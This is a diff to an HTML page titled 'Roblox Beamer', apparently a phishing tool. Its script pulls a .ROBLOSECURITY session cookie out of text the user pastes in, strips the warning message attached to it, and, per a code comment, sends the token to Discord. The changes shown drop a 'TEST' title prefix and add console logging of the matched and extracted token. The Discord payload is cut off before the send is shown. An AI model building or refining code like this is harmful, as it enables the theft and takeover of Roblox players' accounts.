@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TESTRoblox Beamer</title>
+  <title>Roblox Beamer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -62,7 +62,6 @@
       errorMessage.textContent = ""; // Clear any previous error messages
 
       // Check if the message contains the ROBLOSECURITY token
-      // Updated regex to match the correct format with the warning message
       const robloSecurityTokenPattern = /(\.ROBLOSECURITY=[A-Za-z0-9%\-._\|:;\-]+(?:\|{2})?)/i;
       const match = message.match(robloSecurityTokenPattern);
 
@@ -72,8 +71,14 @@
         return;
       }
 
+      // Debugging: log the matched string to the console
+      console.log("Matched Token String: ", match[0]);
+
       // Extract only the ROBLOSECURITY token, removing the warning message
       const token = match[0].split('=')[1].split('|')[0]; // This will remove the warning part
+
+      // Debugging: log the cleaned token to the console
+      console.log("Extracted Token: ", token);
 
       // Send the token to Discord
       const discordPayload = {
